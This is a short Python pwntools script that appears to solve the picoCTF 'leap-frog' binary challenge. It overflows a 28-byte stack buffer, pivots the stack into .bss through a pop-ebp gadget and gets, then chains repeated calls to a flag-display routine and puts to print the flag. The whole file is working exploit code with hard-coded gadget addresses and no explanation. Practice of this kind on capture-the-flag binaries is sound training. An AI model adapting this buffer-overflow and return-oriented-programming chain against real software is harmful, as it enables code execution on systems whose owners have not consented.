from pwn import *
import sys
import string

def start():
    global sh
    stdout = process.PTY
    stdin = process.PTY

    sh = process('/problems/leap-frog_1_2944cde4843abb6dfd6afa31b00c703c/rop', stdin=stdin, stdout=stdout)

bss = 0x804a03c
pop_ebp = p32(0x080485fb)
new_stack = p32(bss + 0x900)
dis_flag = p32(0x080486b3)
flag = p32(0x804a8f4)
move_stack = p32(0x08048406)
get = p32(0x080487b8)
put = p32(0x80486f1)
main = p32(0x080487c9)

payload1 = 'A'*(16+3*4)+ pop_ebp+new_stack+get
payload2 = 'A'*(16+3*4)+ dis_flag + (move_stack + 'A'*12)*20 + put+flag
def test(guess):
    start()
    sh.recvuntil('input>')
    sh.sendline(payload1)
    sh.sendline(payload2)
    output = sh.recvall()
    print output
    if 'pico' in output:
        print output
        return True
    else:
        return False

test(None)
#print payload1 + '\n' + payload2
#while not test(None)
